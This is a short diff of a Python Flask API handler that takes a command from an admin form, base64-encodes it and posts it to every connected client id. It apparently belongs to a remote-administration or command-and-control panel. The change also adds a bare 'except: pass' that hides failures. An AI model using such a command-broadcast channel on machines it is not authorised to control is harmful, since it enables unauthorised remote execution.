@@ -56,8 +56,11 @@ class API(object):
         cmd = request.form['command']
         if cmd:
             encoded_cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
-            for cid in clients:
-                post_command(cid, current_user, encoded_cmd)
+            for cid in clients[0]:
+                try:
+                    post_command(int(cid), current_user, encoded_cmd)
+                except:
+                    pass
         return render_template('admin.html')
 
     @APIRoutes.route('/api/clear', methods=['GET'])
